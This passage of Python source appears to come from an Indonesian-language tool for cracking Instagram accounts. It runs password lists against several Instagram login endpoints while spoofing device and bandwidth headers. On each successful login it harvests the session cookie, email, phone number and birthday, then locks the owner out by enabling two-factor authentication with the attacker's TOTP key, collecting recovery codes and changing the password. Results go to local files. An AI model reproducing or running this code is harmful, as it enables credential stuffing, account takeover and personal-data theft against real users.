                        cokie.update(self.session.cookies.get_dict())
                        if str(ds_id) in self.CrackDuplikat:break
                        else:self.CrackDuplikat.append(ds_id)
                    except:pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                           
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                               ''')
                    else:
                       print(f'''\r                                                
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.Respons.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Recovery
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                  ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1                                      
             _status = '200'
             Console(style=temane[0]).print(f'└──[ code: {_status} logged: {self.ResultSuccess} challenge: {self.ResultChechpoint} hitung: {self.Loop} ]',end='\r')
        #  except Exception as e:print(e)
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def ApiThreads(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                    'x-ig-timezone-offset': str(self.timezone_offset()),
                    'x-ig-app-id': '936619743392459',
                    'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                    # self.HeadersApiLogin()['user-agent'].replace('Instagram','Barcelona')
               })
               passwd  = '#PWD_INSTAGRAM:0:%s:%s'%(int(time.time()), pwb)
               params_ = f'params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(passwd)}%22%2C%22contact_point%22%3A%22{str(users)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{session.headers["x-ig-family-device-id"]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{session.headers["x-ig-android-id"]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
               session.headers.update({'content-length':str(len(params_))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=params_, allow_redirects =True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(session.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}success_login
 {P}methode      : {H}Threads
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}/{postingan}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {U2}{cookie}                                                   ''')
                    else:
                       print(f'''\r                                               
 {H}status       {P}: {H}Success Login
 {H}methode      {P}: {H}Threads
 {H}username     {P}: {H}{info_username}
 {H}password     {P}: {H}{pwb}
 {H}nomor hp     {P}: {H}{info_nomor_hp}
 {H}email        {P}: {H}{info_email}
 {H}birthday     {P}: {H}{info_birthday}
 {H}facebook acc {P}: {H}{akunfb}
 {H}profile data {P}: {H}{info_followers}/{info_following}/{postingan}
 {H}cookie       {P}: {H}{cookie}                                                   ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}|{akunfb}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}failed_login
 {P}methode      : {K2}Threads
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'[white]-* status : [green]{_status} [white]logged : [green]{self.ResultSuccess} [white]challenge : [red]{self.ResultChechpoint} [white]running : [green]{self.Loop} [white]-*',end='\r')
    #    except Exception as e:print(e)
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   #-> LOGIN APK INSTAGRAM
   def Api(self, users, password):
       global file_ok
       with requests.Session() as Client:
         try:
             for pwb in password:
                 Client.headers.update({**self.HeadersApiLogin(),
                      'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                      'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                      'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                      'x-ig-bandwidth-totalbytes-b': str(random.randint(2000,5000)),
                      'x-ig-bandwidth-totaltime-ms': str(random.randint(500,4000)),
                      'x-ig-device-id': str(uuid.uuid4()),
                      'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                      'x-ig-timezone-offset': str(self.timezone_offset()),
                      'x-ig-app-id': '567067343352427',
                      'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
                 })
                 self.payloadIG = 'params={"client_input_params":{"device_id":"'+Client.headers['x-ig-android-id']+'","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'+str(Client.headers['x-mid'])+'","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+pwb+'","sso_token_map_json_string":"","family_device_id":"'+str(uuid.uuid4())+'","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'+users+'","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"18g3p8:57","layered_homepage_experiment_group":null,"should_trigger_override_login_success_action":0,"device_id":null,"login_credential_type":"none","server_login_source":"login","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":7465439600681,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"18g3p8:58","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}&bk_client_context={"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
                 Client.headers.update({'content-length':str(len(self.payloadIG))})
                 self.responsIG = Client.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=self.payloadIG, allow_redirects = True)
                 if 'logged_in_user' in self.responsIG.text.replace('\\',''):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(self.responsIG.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(self.responsIG.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''
                    fbacc  = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                  ''')
                    else:
                       print(f'''\r                                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}
 {P}cookie       : {H}{cookie}                                               ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}|{akunfb}\n')
                    self.ResultSuccess +=1
                    break
                 elif 'redirection_to_checkpoint' in self.responsIG.text.replace('\\',''):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                         
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Manual
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                                          ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
             self.Loop +=1
             try:
                 _status = _status
             except: _status = '200'
             Console(style=temane[0]).print(f'[white]-* status : [green]{_status} [white]logged : [green]{self.ResultSuccess} [white]challenge : [red]{self.ResultChechpoint} [white]running : [green]{self.Loop} [white]-*',end='\r')
         except (AttributeError,requests.exceptions.ConnectionError):
             time.sleep(10)

   def SmartLockGoogle(self, users, password):
       global file_ok
       try:
           for pwb in password:
               session = requests.Session()
               session.headers.update({**self.HeadersApiLogin(),
                  'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                  'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                  'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,999)),
                  'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                  'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                  'x-ig-device-id': str(uuid.uuid4()),
                  'x-ig-family-device-id': str(uuid.uuid4()),
                  'x-ig-android-id': 'android-%s'%(self.Android_ID(users,pwb).hexdigest()[:16]),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'x-ig-app-id': '567067343352427',
                  'user-agent': self.AppUac(self.HeadersApiLogin()['x-bloks-version-id']),
               })

               self.SmartData = {
                  'params': '{"client_input_params":{"device_id":"'+ str(session.headers['x-ig-android-id']) +'","lois_settings":{"lois_token":"","lara_override":""},"name":"'+str(users)+'","machine_id":"'+str(session.headers['x-mid'])+'","profile_pic_url":null,"contact_point":"'+str(users)+'","encrypted_password":"#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pwb)+'"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'+str(session.headers['x-ig-family-device-id'])+'","device_id":"'+str(session.headers['x-ig-device-id'])+'","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'+str(uuid.uuid4())+'","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                  'bk_client_context': '{"bloks_version":"'+ str(session.headers['x-bloks-version-id']) +'","styles_id":"instagram"}',
                  'bloks_versioning_id': str(session.headers['x-bloks-version-id'])
               }
               self.Query = 'params=%s&bk_client_context=%s&bloks_versioning_id=%s'%(urllib.parse.quote(self.SmartData['params']), urllib.parse.quote(self.SmartData['bk_client_context']), self.SmartData['bloks_versioning_id'])
               session.headers.update({'content-length':str(len(self.Query))})
               _respon = session.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data=self.SmartData, allow_redirects = True)
               if 'logged_in_user' in str(_respon.text.replace('\\','')):
                    self.Pepek = self.ChekDuplikat(users)
                    if self.Pepek is False:break
                    cokie = {}
                    try:
                        cok = re.search('"headers":"{"IG-Set-Authorization": "(.*?)"', str(_respon.text.replace('\\',''))).group(1)
                        xyz = base64.b64decode(cok.split(':')[2]).decode()
                        ds_id = re.search('{"ds_user_id":"(\d+)"', str(xyz)).group(1)
                        sn_id = re.search('"sessionid":"(.*?)"', str(xyz)).group(1)
                        cokie.update({"ds_user_id":f"{ds_id}","sessionid":f"{sn_id}"})
                        cokie.update(_respon.cookies.get_dict())
                    except: pass
                    cookie = self.Convert(cokie)
                    akun_info = self.friends_user(cookie)
                    if akun_info is not None:
                       info_email,info_full_nama,info_username,info_nomor_hp,info_birthday,info_followers,info_following = akun_info
                    else:
                       info_followers, info_following, none_postingan = self.friends_user_chek(users)
                       info_email     = ''
                       info_full_nama = ''
                       info_username  = users
                       info_nomor_hp  = ''
                       info_birthday  = ''

                    fbacc = self.Fafo(cookie)
                    akunfb = fbacc
                    if True in self.UbahData:
                       self.a2f = self.TahapPertama2f(cookie)
                       self.cex = 'A2F Di Aktifkan' if self.a2f['success-a2f'] is True else 'A2F Tidak Aktif'
                       self.aut = self.a2f['SecretKey']
                       self.pem = self.a2f['kode-pemulihan']
                       self.PWX = self.SandiBaru(cookie, pwb)
                       print(f'''\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{self.PWX}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}status a2f   : {H}{self.cex}
 {P}authentikasi : {H}{self.aut}
 {P}pemulihan    : {H}{self.pem}
 {P}profile data : {H}{info_followers}/{info_following}/{postingan}
 {P}Facebook acc : {akunfb}
 {P}cookie       : {H}{cookie}                                                             ''')

                    else:
                       print(f'''\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{info_username}
 {P}password     : {H}{pwb}
 {P}nomor hp     : {H}{info_nomor_hp}
 {P}email        : {H}{info_email}
 {P}birthday     : {H}{info_birthday}
 {P}Facebook acc : {akunfb}
 {P}profile data : {H}{info_followers}/{info_following}/{postingan}
 {P}cookie       : {H}{cookie}                                                  ''')
                       self.aut = None
                       self.pem = None
                       self.PWX = pwb
                    open('data/OK-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{info_username}|{self.PWX}|{info_followers}|{info_following}|{self.aut}|{self.pem}|{cookie}|{akunfb}\n')
                    self.ResultSuccess +=1
                    break
               elif 'https://i.instagram.com/challenge' in str(_respon.text.replace('\\','')):
                    followers, following, postingan = self.friends_user_chek(users)
                    print(f'''\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}SmartLock
 {P}username     : {K2}{users}
 {P}password     : {K2}{pwb}
 {P}data profile : {K2}{followers}/{following}/{postingan}                             ''')
                    open('data/CP-Instagram-%s.txt'%(file_ok),'a', encoding='utf-8').write(f'{users}|{pwb}|{followers}/{following}/{postingan}\n')
                    self.ResultChechpoint +=1
                    break
           self.Loop +=1
           _status = '200'
           Console(style=temane[0]).print(f'[white]-* status : [green]{_status} [white]logged : [green]{self.ResultSuccess} [white]challenge : [red]{self.ResultChechpoint} [white]running : [green]{self.Loop} [white]-*',end='\r')
       except (AttributeError,requests.exceptions.ConnectionError):
          time.sleep(10)

   def data_graph(self, xxx):
       data = {
           'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
           '__d': 'www',
           '__user': '0',
           '__a':'1',
           '__req': 'h',
           '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
           'dpr': '2',
           '__ccg': 'GOOD',
           '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
           '__s': '',
           '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
           '__dyn': '',
           '__csr': '',
           '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
           'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),
           'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
           'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
           '__spin_b': 'trunk',
           '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
           'fb_api_caller_class': 'RelayModern',
           'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
           'server_timestamps': 'true',
           'doc_id': '6888165191230459'
       }
       return(data)

   def headers_graph(self, xxx):
       headers = {
           'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
           'x-ig-app-id': '1217981644879628',
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
           'content-type': 'application/x-www-form-urlencoded',
           'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),
           'accept': '*/*',
       }
       return(headers)

   def TahapPertama2f(self, cokie, url = 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
       try:
           resp = requests.Session().get(url, cookies = {'cookie': cokie}).text
           head = self.headers_graph(resp)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'content-type': 'application/x-www-form-urlencoded',
               'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
               'x-ig-app-id': '1217981644879628',
           })
           data = self.data_graph(resp)
           data.update({
               'fb_api_caller_class':'RelayModern',
               'fb_api_req_friendly_name':'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
               'variables':json.dumps({"input":{"client_mutation_id":f"{self.ClientId(resp)}","actor_id":f"{self.AccountId(resp)}","account_id":f"{self.AccountId(resp)}","account_type":"INSTAGRAM","device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),
               'doc_id':'6282672078501565',
           })
           get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies = {'cookie':cokie}).text
           if "totp_key" in str(get_p):
              xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
              hpsx = xnxx.replace(' ','')
              kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
              self.info.update({'SecretKey':hpsx})
              self.AktifkanA2f(cokie, kode, resp, hpsx)
           else:
              self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'SecretKey':'Kode Authentikasi Tidak Ada'})
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       return self.info

   def AktifkanA2f(self, cokie, code, resp, auth):
       try:
           xxx, ua = resp, 'Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)'
           head = self.headers_graph(resp)
           head.update({
              'Host': 'accountscenter.instagram.com',
              'x-ig-app-id': '1217981644879628',
              'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(resp)).group(1),
              'content-type': 'application/x-www-form-urlencoded',
              'user-agent': ua,
              'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
           })
           data = {'av':self.AccountId(resp),'__user':'0','__a':'1','__req':'14','__hs':re.search('"haste_session":"(.*?)"', str(xxx)).group(1),'dpr':'2','__ccg':'GOOD','__rev':re.search('{"rev":(.*?)}',str(xxx)).group(1),'__hsi':re.findall('"hsi":"(\d+)"',str(xxx))[0],'__comet_req':'24','fb_dtsg':re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}',str(xxx)).group(1),'jazoest':re.findall('&jazoest=(\d+)',str(xxx))[0],'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(xxx)).group(1),'__spin_r':re.findall('"__spin_r":(\d+)', str(xxx))[0],'__spin_b':'trunk','__spin_t':re.findall('"__spin_t":(\d+)', str(xxx))[0],'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'useFXSettingsTwoFactorEnableTOTPMutation','variables':json.dumps({"input":{"client_mutation_id":re.search('{"clientID":"(.*?)"}',str(resp)).group(1),"actor_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_id":re.findall('"actorID":"(\d+)"', str(resp))[0],"account_type":"INSTAGRAM","verification_code":code,"device_id":"device_id_fetch_ig_did","fdid":"device_id_fetch_ig_did"}}),'server_timestamps':'true','doc_id':'7032881846733167'}
           ondw = requests.Session().post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie':cokie}).text
           if '"success":true' in str(ondw):
              self.info.update({'success-a2f':True})
              reco = self.get_code(cokie, resp)
              if reco is not None:
                 try:
                     kode = reco['data']['xfb_two_factor_regenerate_recovery_codes']['recovery_codes']
                     self.info.update({'kode-pemulihan':kode})
                 except:
                     self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
              else:self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
           else:
              self.info.update({'success-a2f':False})
              self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak Ada'})
       except Exception as e:
          self.info.update({'success-a2f':False})
          self.info.update({'kode-pemulihan':'Kode Pemulihan Tidak ada'})

   def AccountId(self, xxx):
       try:
           Userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
           return(Userid)
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.AccountId(xxx)

   def ClientId(self, xxx):
       try:
           Clients = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
           return Clients
       except AttributeError:return('')
       except requests.exceptions.ConnectionError: time.sleep(5); self.ClientId(xxx)

   def get_code(self, cokie, response):
       try:
           data = self.data_graph(response)
           clin = self.ClientId(response)
           user = data['av']
           data.update({'__req':'t','__s':'','__dyn':'','__csr':'','fb_api_req_friendly_name':'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation','variables':'{"input":{"client_mutation_id":"'+clin+'","actor_id":"'+user+'","account_id":"'+user+'","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}','doc_id':'24010978991879298'})
           head = self.headers_graph(response)
           head.update({
               'Host': 'accountscenter.instagram.com',
               'sec-ch-ua': 'Not_A',
               'x-ig-app-id': '936619743392459',
